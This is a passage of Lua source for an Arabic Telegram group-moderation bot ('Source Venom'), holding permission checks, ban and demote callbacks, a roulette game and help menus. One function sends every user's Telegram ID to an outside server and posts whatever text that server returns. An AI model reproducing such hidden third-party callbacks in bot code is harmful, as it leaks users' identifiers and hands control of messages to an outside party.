if GetInfo.result.can_promote_members == true then VIP = '✔️' else VIP = '✖️' end 
send(msg.chat_id_,msg.id_,'𖠧︙صلاحيات '..GetCustomTitle(user_id,msg.chat_id_)..' هي ↫ ⤈\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n𖠧︙حذف الرسائل ↫ '..DEL..'\n𖠧︙دعوة المستخدمين ↫ '..INV..'\n𖠧︙حظر المستخدمين ↫ '..BAN..'\n𖠧︙تثبيت الرسائل ↫ '..PIN..'\n𖠧︙تغيير المعلومات ↫ '..EDT..'\n𖠧︙اضافة مشرفين ↫ '..VIP..'\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉')
end
end
end
--     Source Venom     --
function GetBio(chat_id)
local Check = https.request('https://api.telegram.org/bot'..TokenBot..'/getChat?chat_id='..chat_id)
local GetInfo = JSON.decode(Check)
if GetInfo.ok == true then
if GetInfo.result.bio then 
Abs = GetInfo.result.bio
else 
Abs = "لا يوجد"
end
end
return Abs
end
--     Source Venom     --
local sendRequest = function(request_id, chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, input_message_content, callback, extra)
tdcli_function({ ID = request_id, chat_id_ = chat_id, reply_to_message_id_ = reply_to_message_id, disable_notification_ = disable_notification, from_background_ = from_background, reply_markup_ = reply_markup, input_message_content_ = input_message_content }, callback or dl_cb, extra)
end
local sendDocument = function(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, document, caption, cb, cmd)
local input_message_content = { ID = "InputMessageDocument", document_ = getInputFile(document), caption_ = caption } sendRequest("SendMessage", chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, input_message_content, cb, cmd)
end
local function sendVoice(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, voice, duration, waveform, caption, cb, cmd)
local input_message_content = { ID = "InputMessageVoice", voice_ = getInputFile(voice), duration_ = duration or 0, waveform_ = waveform, caption_ = caption } sendRequest('SendMessage', chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, input_message_content, cb, cmd)
end
local function sendAudio(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, audio, duration, waveform, caption, cb, cmd)
local input_message_content = { ID = "InputMessageAudio", audio_ = getInputFile(audio), duration_ = duration or 0, waveform_ = waveform, caption_ = caption } sendRequest('SendMessage', chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, input_message_content, cb, cmd)
end
local function sendVideo(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, video, duration, width, height, caption, cb, cmd)    
local input_message_content = { ID = "InputMessageVideo",      video_ = getInputFile(video),      added_sticker_file_ids_ = {},      duration_ = duration or 0,      width_ = width or 0,      height_ = height or 0,      caption_ = caption    }    sendRequest('SendMessage', chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, input_message_content, cb, cmd)  
end
local sendSticker = function(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, sticker)
local input_message_content = { ID = "InputMessageSticker", sticker_ = getInputFile(sticker), width_ = 0, height_ = 0 } sendRequest("SendMessage", chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, input_message_content, cb, cmd)
end 
function formsgs(msgs) 
local MsgText = ''  
if tonumber(msgs) < 100 then 
MsgText = 'جدا ضعيف' 
elseif tonumber(msgs) < 250 then 
MsgText = 'ضعيف' 
elseif tonumber(msgs) < 500 then 
MsgText = 'غير متفاعل' 
elseif tonumber(msgs) < 750 then 
MsgText = 'متوسط' 
elseif tonumber(msgs) < 1000 then 
MsgText = 'متفاعل' 
elseif tonumber(msgs) < 2000 then 
MsgText = 'قمة التفاعل' 
elseif tonumber(msgs) < 3000 then 
MsgText = 'ملك التفاعل'  
elseif tonumber(msgs) < 4000 then 
MsgText = 'اسطورة التفاعل' 
elseif tonumber(msgs) < 5000 then 
MsgText = 'متفاعل نار' 
elseif tonumber(msgs) < 6000 then 
MsgText = 'يجدح جدح' 
elseif tonumber(msgs) < 7000 then 
MsgText = 'خيالي' 
elseif tonumber(msgs) < 8000 then 
MsgText = 'رب التفاعل' 
elseif tonumber(msgs) < 9000 then 
MsgText = 'كافر بالتفاعل' 
elseif tonumber(msgs) < 10000000000 then 
MsgText = "معلك لربك" 
end 
return MsgText
end
--     Source Venom     --
function absmoned(chat_id, user_id, msg_id, text, offset, length) local tt = DevAbs:get(Venom..'endmsg') or '' tdcli_function ({ ID = "SendMessage", chat_id_ = chat_id, reply_to_message_id_ = msg_id, disable_notification_ = 0, from_background_ = 1, reply_markup_ = nil, input_message_content_ = { ID = "InputMessageText", text_ = text..'\n\n'..tt, disable_web_page_preview_ = 1, clear_draft_ = 0, entities_ = {[0]={ ID="MessageEntityMentionName", offset_=offset, length_=length, user_id_=user_id }, }, }, }, dl_cb, nil) end
--     Source Venom     --
function SourceCh(msg) 
local url,res = https.request('https://apiabs.ml/SourceCh.php?id='..msg.sender_user_id_)
data = JSON.decode(url)
if data.ChatMember.Venom ~= true then
Var = false
keyboard = {} 
keyboard.inline_keyboard = {{{text=data.ChatMember.Title,url=data.ChatMember.Url}}} 
Msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id='..msg.chat_id_..'&text=' .. URL.escape(data.ChatMember.Venom).."&reply_to_message_id="..Msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
else
Var = true
end
return Var
end
function ChCheck(msg)
local var = true 
if DevAbs:get(Venom.."Abs:ChId") then
local url , res = https.request('https://api.telegram.org/bot'..TokenBot..'/getchatmember?chat_id='..DevAbs:get(Venom..'Abs:ChId')..'&user_id='..msg.sender_user_id_)
local data = json:decode(url)
if res ~= 200 or data.result.status == "left" or data.result.status == "kicked" then
var = false 
if DevAbs:get(Venom..'Abs:ChText') then
local ChText = DevAbs:get(Venom..'Abs:ChText')
send(msg.chat_id_,msg.id_,'['..ChText..']')
else
local Check = https.request('https://api.telegram.org/bot'..TokenBot..'/getChat?chat_id='..DevAbs:get(Venom.."Abs:ChId"))
local GetInfo = JSON.decode(Check)
if GetInfo.result.username then
User = "https://t.me/"..GetInfo.result.username
else
User = GetInfo.result.invite_link
end
Text = "𖠧︙عذرا لاتستطيع استخدام البوت !\n𖠧︙عليك الاشتراك في القناة اولا :"
keyboard = {} 
keyboard.inline_keyboard = {{{text=GetInfo.result.title,url=User}}} 
Msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id='..msg.chat_id_..'&text=' .. URL.escape(Text).."&reply_to_message_id="..Msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
elseif data.ok then
return var
end
else
return var
end
end
function tdcli_update_callback(data)
if (data.ID == "UpdateNewCallbackQuery") then
local Chat_Id2 = data.chat_id_
local MsgId2 = data.message_id_
local DataText = data.payload_.data_
local Msg_Id2 = data.message_id_/2097152/0.5
if DataText == '/delyes' and DevAbs:get(Venom..'yes'..data.sender_user_id_) == 'delyes' then
DevAbs:del(Venom..'yes'..data.sender_user_id_, 'delyes')
DevAbs:del(Venom..'no'..data.sender_user_id_, 'delno')
if RankChecking(data.sender_user_id_, data.chat_id_) then
EditMsg(Chat_Id2, Msg_Id2, "𖠧︙لا استطيع طرد ↫ "..IdRank(data.sender_user_id_, data.chat_id_)) 
return false
end
tdcli_function({ID="ChangeChatMemberStatus",chat_id_=data.chat_id_,user_id_=data.sender_user_id_,status_={ID="ChatMemberStatusKicked"},},function(arg,da) 
if (da and da.code_ and da.code_ == 400 and da.message_ == "CHAT_ADMIN_REQUIRED") then 
EditMsg(Chat_Id2, Msg_Id2, "𖠧︙ليس لدي صلاحية حظر المستخدمين يرجى تفعيلها !") 
return false  
end
if (da and da.code_ and da.code_ == 3) then 
EditMsg(Chat_Id2, Msg_Id2, "𖠧︙البوت ليس ادمن يرجى ترقيتي !") 
return false  
end
if da and da.code_ and da.code_ == 400 and da.message_ == "USER_ADMIN_INVALID" then 
EditMsg(Chat_Id2, Msg_Id2, "𖠧︙لا استطيع طرد مشرفين المجموعه") 
return false  
end
if da and da.ID and da.ID == "Ok" then
ChatKick(data.chat_id_, data.sender_user_id_)
EditMsg(Chat_Id2, Msg_Id2, "𖠧︙تم طردك من المجموعه") 
return false
end
end,nil)  
end
if DataText == '/delno' and DevAbs:get(Venom..'no'..data.sender_user_id_) == 'delno' then
DevAbs:del(Venom..'yes'..data.sender_user_id_, 'delyes')
DevAbs:del(Venom..'no'..data.sender_user_id_, 'delno')
EditMsg(Chat_Id2, Msg_Id2, "𖠧︙تم الغاء امر اطردني") 
end
--     Source Venom     --
if DataText == '/yesdel' and DevAbs:get(Venom..'yesdel'..data.sender_user_id_) == 'delyes' then
DevAbs:del(Venom..'yesdel'..data.sender_user_id_, 'delyes')
DevAbs:del(Venom..'nodel'..data.sender_user_id_, 'delno')
if DevAbs:sismember(Venom..'Abs:Constructor:'..data.chat_id_, data.sender_user_id_) then
constructor = 'المنشئين • ' else constructor = '' end 
if DevAbs:sismember(Venom..'Abs:Managers:'..data.chat_id_, data.sender_user_id_) then
Managers = 'المدراء • ' else Managers = '' end
if DevAbs:sismember(Venom..'Abs:Admins:'..data.chat_id_, data.sender_user_id_) then
admins = 'الادمنيه • ' else admins = '' end
if DevAbs:sismember(Venom..'Abs:VipMem:'..data.chat_id_, data.sender_user_id_) then
vipmem = 'المميزين • ' else vipmem = '' end
if DevAbs:sismember(Venom..'Abs:Cleaner:'..data.chat_id_, data.sender_user_id_) then
cleaner = 'المنظفين • ' else cleaner = '' end
if DevAbs:sismember(Venom..'User:Donky:'..data.chat_id_, data.sender_user_id_) then
donky = 'المطايه • ' else donky = '' end
if DevAbs:sismember(Venom..'Abs:Constructor:'..data.chat_id_, data.sender_user_id_) or DevAbs:sismember(Venom..'Abs:Managers:'..data.chat_id_, data.sender_user_id_) or DevAbs:sismember(Venom..'Abs:Admins:'..data.chat_id_, data.sender_user_id_) or DevAbs:sismember(Venom..'Abs:VipMem:'..data.chat_id_, data.sender_user_id_) or DevAbs:sismember(Venom..'Abs:Cleaner:'..data.chat_id_, data.sender_user_id_) or DevAbs:sismember(Venom..'User:Donky:'..data.chat_id_, data.sender_user_id_) then
DevAbs:srem(Venom..'Abs:Constructor:'..data.chat_id_,data.sender_user_id_)
DevAbs:srem(Venom..'Abs:Managers:'..data.chat_id_,data.sender_user_id_)
DevAbs:srem(Venom..'Abs:Admins:'..data.chat_id_,data.sender_user_id_)
DevAbs:srem(Venom..'Abs:VipMem:'..data.chat_id_,data.sender_user_id_)
DevAbs:srem(Venom..'Abs:Cleaner:'..data.chat_id_,data.sender_user_id_)
DevAbs:srem(Venom..'User:Donky:'..data.chat_id_,data.sender_user_id_)
EditMsg(Chat_Id2, Msg_Id2, "𖠧︙تم تنزيلك من ↫ ⤈\n~ ( "..constructor..Managers..admins..vipmem..cleaner..donky.." ) ~ \n") 
else 
if IdRank(data.sender_user_id_, data.chat_id_) == 'العضو' then
EditMsg(Chat_Id2, Msg_Id2, "𖠧︙ليس لديك رتبه في البوت") 
else 
EditMsg(Chat_Id2, Msg_Id2, "𖠧︙لا استطيع تنزيل ↫ "..IdRank(data.sender_user_id_, data.chat_id_)) 
end
end
end
if DevAbs:get(Venom.."Abs:NewDev"..data.sender_user_id_) then
if DataText == '/setno' then
EditMsg(Chat_Id2, Msg_Id2, "𖠧︙تم الغاء امر تغير المطور الاساسي") 
DevAbs:del(Venom.."Abs:NewDev"..data.sender_user_id_)
return false
end
if DataText == '/setyes' then
local NewDev = DevAbs:get(Venom.."Abs:NewDev"..data.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = NewDev},function(arg,dp) 
EditMsg(Chat_Id2, Msg_Id2, "𖠧︙المطور الجديد ↫ ["..dp.first_name_.."](tg://user?id="..dp.id_..")\n𖠧︙تم تغير المطور الاساسي بنجاح") 
end,nil)
tdcli_function ({ID = "GetUser",user_id_ = data.sender_user_id_},function(arg,dp) 
SendText(NewDev,"𖠧︙بواسطة ↫ ["..dp.first_name_.."](tg://user?id="..dp.id_..")\n𖠧︙لقد اصبحت انت مطور هذا البوت",0,'md')
end,nil)
local Create = function(data, file, uglify)  
file = io.open(file, "w+")   
local serialized   
if not uglify then  
serialized = serpent.block(data, {comment = false, name = "Config"})  
else  
serialized = serpent.dump(data)  
end    
file:write(serialized)
file:close()  
end
Config = {
DevId = NewDev,
TokenBot = TokenBot,
Venom = TokenBot:match("(%d+)"),
SudoIds = {NewDev},
}
Create(Config, "./config.lua")  
DevAbs:del(Venom.."Abs:NewDev"..data.sender_user_id_)
dofile('Venom.lua') 
end
end
if DataText == '/nodel' and DevAbs:get(Venom..'nodel'..data.sender_user_id_) == 'delno' then
DevAbs:del(Venom..'yesdel'..data.sender_user_id_, 'delyes')
DevAbs:del(Venom..'nodel'..data.sender_user_id_, 'delno')
EditMsg(Chat_Id2, Msg_Id2, "𖠧︙تم الغاء امر نزلني") 
end
if DataText == '/YesRolet' and DevAbs:get(Venom.."Abs:WittingStartRolet"..data.chat_id_..data.sender_user_id_) then
local List = DevAbs:smembers(Venom..'Abs:ListRolet'..data.chat_id_) 
local UserName = List[math.random(#List)]
tdcli_function ({ID="SearchPublicChat",username_ = UserName},function(arg,dp) 
DevAbs:incrby(Venom..'Abs:GamesNumber'..data.chat_id_..dp.id_, 5) 
end,nil) 
DevAbs:del(Venom..'Abs:ListRolet'..data.chat_id_) 
DevAbs:del(Venom.."Abs:WittingStartRolet"..data.chat_id_..data.sender_user_id_)
EditMsg(Chat_Id2, Msg_Id2, "𖠧︙*صاحب الحظ* ↫ ["..UserName.."]\n𖠧︙*مبروك لقد ربحت وحصلت على 5 نقاط يمكنك استبدالها بالرسائل*")
end
if DataText == '/NoRolet' then
DevAbs:del(Venom..'Abs:ListRolet'..data.chat_id_) 
DevAbs:del(Venom.."Abs:NumRolet"..data.chat_id_..data.sender_user_id_) 
DevAbs:del(Venom.."Abs:WittingStartRolet"..data.chat_id_..data.sender_user_id_)
EditMsg(Chat_Id2, Msg_Id2, "𖠧︙تم الغاء اللعبه لاعادة اللعب ارسل الالعاب") 
end
if DataText == '/ListRolet' then
local List = DevAbs:smembers(Venom..'Abs:ListRolet'..data.chat_id_) 
local Text = '𖠧︙قائمة الاعبين ↫ ⤈\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n' 
local Textt = '┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n𖠧︙تم اكتمال العدد الكلي هل انت مستعد ؟'
for k, v in pairs(List) do 
Text = Text..k.."~ : [" ..v.."]\n"  
end 
keyboard = {} 
keyboard.inline_keyboard = {{{text="نعم",callback_data="/YesRolet"},{text="لا",callback_data="/NoRolet"}}} 
return https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text..Textt).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
if DataText == '/UnTkeed' then
if DevAbs:sismember(Venom..'Abs:Tkeed:'..Chat_Id2, data.sender_user_id_) then
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..Chat_Id2.."&user_id="..data.sender_user_id_.."&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")
DevAbs:srem(Venom..'Abs:Tkeed:'..Chat_Id2, data.sender_user_id_)
DeleteMessage(Chat_Id2,{[0] = MsgId2})
return https.request("https://api.telegram.org/bot"..TokenBot..'/answercallbackquery?callback_query_id='..data.id_..'&text='..URL.escape("𖠧 تم الغاء تقيدك من المجموعه بنجاح .")..'&show_alert=true')
else
return https.request("https://api.telegram.org/bot"..TokenBot..'/answercallbackquery?callback_query_id='..data.id_..'&text='..URL.escape("𖠧 عذرا هذا الامر لكشف الروبوت وليس لك .")..'&show_alert=true')
end 
end
if DataText and DataText:match('/DelRed:'..tonumber(data.sender_user_id_)..'(.*)') then
local Abbs = DataText:match('/DelRed:'..tonumber(data.sender_user_id_)..'(.*)')
EditMsg(Chat_Id2, Msg_Id2, "𖠧︙الكلمه ↫ "..Abbs.." تم حذفها") 
DevAbs:del(Venom..'Abs:Text:GpTexts'..Abbs..data.chat_id_)
DevAbs:srem(Venom..'Abs:Manager:GpRedod'..data.chat_id_,Abbs)
end
if DataText and DataText:match('/EndRedod:'..tonumber(data.sender_user_id_)..'(.*)') then
local Abbs = DataText:match('/EndRedod:'..tonumber(data.sender_user_id_)..'(.*)')
local List = DevAbs:smembers(Venom..'Abs:Text:GpTexts'..Abbs..data.chat_id_)
if DevAbs:get(Venom..'Abs:Add:GpRedod'..data.sender_user_id_..data.chat_id_) then
EditMsg(Chat_Id2, Msg_Id2, "𖠧︙تم انهاء وحفظ ↫ "..#List.." من الردود المتعدده للامر ↫ "..Abbs) 
DevAbs:del(Venom..'Abs:Add:GpRedod'..data.sender_user_id_..data.chat_id_)
else
EditMsg(Chat_Id2, Msg_Id2, "𖠧︙عذرا صلاحية الامر منتهيه !") 
end
end
if DataText and DataText:match('/DelRedod:'..tonumber(data.sender_user_id_)..'(.*)') then
local Abbs = DataText:match('/DelRedod:'..tonumber(data.sender_user_id_)..'(.*)')
if DevAbs:get(Venom..'Abs:Add:GpRedod'..data.sender_user_id_..data.chat_id_) then
EditMsg(Chat_Id2, Msg_Id2, "𖠧︙تم الغاء عملية حفظ الردود المتعدده للامر ↫ "..Abbs) 
DevAbs:del(Venom..'Abs:Add:GpRedod'..data.sender_user_id_..data.chat_id_)
DevAbs:del(Venom..'Abs:Text:GpTexts'..Abbs..data.chat_id_)
DevAbs:del(Venom..'Abs:Add:GpTexts'..data.sender_user_id_..data.chat_id_)
DevAbs:srem(Venom..'Abs:Manager:GpRedod'..data.chat_id_,Abbs)
else
EditMsg(Chat_Id2, Msg_Id2, "𖠧︙عذرا صلاحية الامر منتهيه !") 
end
end
if DataText and DataText:match('/HideHelpList:(.*)') then
local Abbs = DataText:match('/HideHelpList:(.*)')
if tonumber(Abbs) == tonumber(data.sender_user_id_) then
EditMsg(Chat_Id2, Msg_Id2, "𖠧︙تم اخفاء كليشة الاوامر") 
else
return https.request("https://api.telegram.org/bot"..TokenBot..'/answercallbackquery?callback_query_id='..data.id_..'&text='..URL.escape("𖠧 عذرا الامر ليس لك .")..'&show_alert=true')
end
end
if DataText and DataText:match('/HelpList:(.*)') then
local Abbs = DataText:match('/HelpList:(.*)')
if tonumber(Abbs) == tonumber(data.sender_user_id_) then
local Help = DevAbs:get(Venom..'Abs:Help')
local Text = [[
𖠧︙اهلا بك في قائمة الاوامر ↫ ⤈ 
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
𖠧︙م1 ↫ اوامر الحمايه
𖠧︙م2 ↫ اوامر الادمنيه
𖠧︙م3 ↫ اوامر المدراء
𖠧︙م4 ↫ اوامر المنشئين
𖠧︙م5 ↫ اوامر المطورين
𖠧︙م6 ↫ اوامر الاعضاء
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
𖠧︙[Source Channel](https://t.me/venom_source)
]] 
keyboard = {} 
keyboard.inline_keyboard = {{{text="اوامر الادمنيه",callback_data="/HelpList2:"..data.sender_user_id_},{text="اوامر الحمايه",callback_data="/HelpList1:"..data.sender_user_id_}},{{text="اوامر المنشئين",callback_data="/HelpList4:"..data.sender_user_id_},{text="اوامر المدراء",callback_data="/HelpList3:"..data.sender_user_id_}},{{text="اوامر الاعضاء",callback_data="/HelpList6:"..data.sender_user_id_},{text="اوامر المطورين",callback_data="/HelpList5:"..data.sender_user_id_}},{{text="• اخفاء الكليشه •",callback_data="/HideHelpList:"..data.sender_user_id_}}}
return https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Help or Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
else
return https.request("https://api.telegram.org/bot"..TokenBot..'/answercallbackquery?callback_query_id='..data.id_..'&text='..URL.escape("𖠧 عذرا الامر ليس لك .")..'&show_alert=true')
end
end
if DataText and DataText:match('/HelpList1:(.*)') then
local Abbs = DataText:match('/HelpList1:(.*)')
if tonumber(Abbs) == tonumber(data.sender_user_id_) then
if not Admin(data) then
return https.request("https://api.telegram.org/bot"..TokenBot..'/answercallbackquery?callback_query_id='..data.id_..'&text='..URL.escape("𖠧 عذرا ليس لديك صلاحية التحكم لهذا الامر .")..'&show_alert=true')
end
local Help = DevAbs:get(Venom..'Abs:Help1')
local Text = [[
𖠧︙اوامر حماية المجموعه ↫ ⤈
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
𖠧︙قفل • فتح ↫ الروابط
𖠧︙قفل • فتح ↫ المعرفات
𖠧︙قفل • فتح ↫ البوتات
𖠧︙قفل • فتح ↫ المتحركه
𖠧︙قفل • فتح ↫ الملصقات
𖠧︙قفل • فتح ↫ الملفات
𖠧︙قفل • فتح ↫ الصور
𖠧︙قفل • فتح ↫ الفيديو
𖠧︙قفل • فتح ↫ الاونلاين
𖠧︙قفل • فتح ↫ الدردشه
𖠧︙قفل • فتح ↫ التوجيه
𖠧︙قفل • فتح ↫ الاغاني
𖠧︙قفل • فتح ↫ الصوت
𖠧︙قفل • فتح ↫ الجهات
𖠧︙قفل • فتح ↫ الماركداون
𖠧︙قفل • فتح ↫ التكرار
𖠧︙قفل • فتح ↫ الهاشتاك
𖠧︙قفل • فتح ↫ التعديل
𖠧︙قفل • فتح ↫ التثبيت
𖠧︙قفل • فتح ↫ الاشعارات
𖠧︙قفل • فتح ↫ الكلايش
𖠧︙قفل • فتح ↫ الدخول
𖠧︙قفل • فتح ↫ الشبكات
𖠧︙قفل • فتح ↫ المواقع
𖠧︙قفل • فتح ↫ الفشار
𖠧︙قفل • فتح ↫ الكفر
𖠧︙قفل • فتح ↫ الطائفيه
𖠧︙قفل • فتح ↫ الكل
𖠧︙قفل • فتح ↫ العربيه
𖠧︙قفل • فتح ↫ الانكليزيه
𖠧︙قفل • فتح ↫ الفارسيه
𖠧︙قفل • فتح ↫ التفليش
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
𖠧︙اوامر حمايه اخرى ↫ ⤈
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
𖠧︙قفل • فتح + الامر ↫ ⤈
𖠧︙التكرار بالطرد
𖠧︙التكرار بالكتم
𖠧︙التكرار بالتقيد
𖠧︙الفارسيه بالطرد
𖠧︙البوتات بالطرد
𖠧︙البوتات بالتقيد
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
𖠧︙[Source Channel](https://t.me/venom_source)
]]
keyboard = {} 
keyboard.inline_keyboard = {{{text="اوامر الادمنيه",callback_data="/HelpList2:"..data.sender_user_id_}},{{text="اوامر المنشئين",callback_data="/HelpList4:"..data.sender_user_id_},{text="اوامر المدراء",callback_data="/HelpList3:"..data.sender_user_id_}},{{text="اوامر الاعضاء",callback_data="/HelpList6:"..data.sender_user_id_},{text="اوامر المطورين",callback_data="/HelpList5:"..data.sender_user_id_}},{{text="• اخفاء الكليشه •",callback_data="/HideHelpList:"..data.sender_user_id_}},{{text="• رجوع •",callback_data="/HelpList:"..data.sender_user_id_}}}
return https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Help or Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
else
return https.request("https://api.telegram.org/bot"..TokenBot..'/answercallbackquery?callback_query_id='..data.id_..'&text='..URL.escape("𖠧 عذرا الامر ليس لك .")..'&show_alert=true')
end
end
if DataText and DataText:match('/HelpList2:(.*)') then
local Abbs = DataText:match('/HelpList2:(.*)')
if tonumber(Abbs) == tonumber(data.sender_user_id_) then
if not Admin(data) then
return https.request("https://api.telegram.org/bot"..TokenBot..'/answercallbackquery?callback_query_id='..data.id_..'&text='..URL.escape("𖠧 عذرا ليس لديك صلاحية التحكم لهذا الامر .")..'&show_alert=true')
end
local Help = DevAbs:get(Venom..'Abs:Help2')
local Text = [[
𖠧︙اوامر الادمنيه ↫ ⤈
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
𖠧︙الاعدادت
𖠧︙تاك للكل 
𖠧︙انشاء رابط
𖠧︙ضع وصف
𖠧︙ضع رابط
𖠧︙ضع صوره
𖠧︙حذف الرابط
𖠧︙حذف المطايه
𖠧︙كشف البوتات
𖠧︙طرد البوتات
𖠧︙تنظيف + العدد
𖠧︙تنظيف التعديل
𖠧︙كللهم + الكلمه
𖠧︙اسم البوت + الامر
𖠧︙ضع • حذف ↫ ترحيب
𖠧︙ضع • حذف ↫ قوانين
𖠧︙اضف • حذف ↫ صلاحيه
𖠧︙الصلاحيات • حذف الصلاحيات
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
𖠧︙ضع سبام + العدد
𖠧︙ضع تكرار + العدد
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
𖠧︙رفع مميز • تنزيل مميز
𖠧︙المميزين • حذف المميزين
𖠧︙كشف القيود • رفع القيود
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
𖠧︙حذف • مسح + بالرد
𖠧︙منع • الغاء منع
𖠧︙قائمه المنع
𖠧︙حذف قائمه المنع
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
𖠧︙تفعيل • تعطيل ↫ الرابط
𖠧︙تفعيل • تعطيل ↫ الالعاب
𖠧︙تفعيل • تعطيل ↫ الترحيب
𖠧︙تفعيل • تعطيل ↫ التاك للكل
𖠧︙تفعيل • تعطيل ↫ كشف الاعدادات
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
𖠧︙طرد المحذوفين
𖠧︙طرد ↫ بالرد • بالمعرف • بالايدي
𖠧︙كتم • الغاء كتم
𖠧︙تقيد • الغاء تقيد
𖠧︙حظر • الغاء حظر
𖠧︙المكتومين • حذف المكتومين
𖠧︙المقيدين • حذف المقيدين
𖠧︙المحظورين • حذف المحظورين
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
𖠧︙تقييد دقيقه + عدد الدقائق
𖠧︙تقييد ساعه + عدد الساعات
𖠧︙تقييد يوم + عدد الايام
𖠧︙الغاء تقييد ↫ لالغاء التقييد بالوقت
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
𖠧︙[Source Channel](https://t.me/venom_source)
]]
keyboard = {} 
keyboard.inline_keyboard = {{{text="اوامر الحمايه",callback_data="/HelpList1:"..data.sender_user_id_}},{{text="اوامر المنشئين",callback_data="/HelpList4:"..data.sender_user_id_},{text="اوامر المدراء",callback_data="/HelpList3:"..data.sender_user_id_}},{{text="اوامر الاعضاء",callback_data="/HelpList6:"..data.sender_user_id_},{text="اوامر المطورين",callback_data="/HelpList5:"..data.sender_user_id_}},{{text="• اخفاء الكليشه •",callback_data="/HideHelpList:"..data.sender_user_id_}},{{text="• رجوع •",callback_data="/HelpList:"..data.sender_user_id_}}}
return https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Help or Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
else
return https.request("https://api.telegram.org/bot"..TokenBot..'/answercallbackquery?callback_query_id='..data.id_..'&text='..URL.escape("𖠧 عذرا الامر ليس لك .")..'&show_alert=true')
end
end
if DataText and DataText:match('/HelpList3:(.*)') then
local Abbs = DataText:match('/HelpList3:(.*)')
if tonumber(Abbs) == tonumber(data.sender_user_id_) then
if not Admin(data) then
return https.request("https://api.telegram.org/bot"..TokenBot..'/answercallbackquery?callback_query_id='..data.id_..'&text='..URL.escape("𖠧 عذرا ليس لديك صلاحية التحكم لهذا الامر .")..'&show_alert=true')
end
local Help = DevAbs:get(Venom..'Abs:Help3')
local Text = [[
𖠧︙اوامر المدراء ↫ ⤈
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
𖠧︙فحص البوت
𖠧︙ضع اسم + الاسم
𖠧︙اضف • حذف ↫ رد
𖠧︙ردود المدير
𖠧︙حذف ردود المدير
𖠧︙اضف • حذف ↫ رد متعدد
𖠧︙حذف رد من متعدد
𖠧︙الردود المتعدده
𖠧︙حذف الردود المتعدده
𖠧︙حذف قوائم المنع
𖠧︙منع ↫ بالرد على ( ملصق • صوره • متحركه )
𖠧︙حذف قائمه منع + ↫ ⤈
( الصور • المتحركات • الملصقات )
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
𖠧︙تنزيل الكل
𖠧︙رفع ادمن • تنزيل ادمن
𖠧︙الادمنيه • حذف الادمنيه
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
𖠧︙تثبيت
𖠧︙الغاء التثبيت
𖠧︙اعاده التثبيت
𖠧︙الغاء تثبيت الكل
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
𖠧︙تغير رد + اسم الرتبه + النص ↫ ⤈
𖠧︙المطور • منشئ الاساسي
𖠧︙المنشئ • المدير • الادمن
𖠧︙المميز • المنظف • العضو
𖠧︙حذف ردود الرتب
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
𖠧︙تغيير الايدي ↫ لتغيير الكليشه
𖠧︙تعيين الايدي ↫ لتعيين الكليشه
𖠧︙حذف الايدي ↫ لحذف الكليشه
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
𖠧︙تفعيل • تعطيل + الامر ↫ ⤈
𖠧︙اطردني • الايدي بالصوره • الابراج
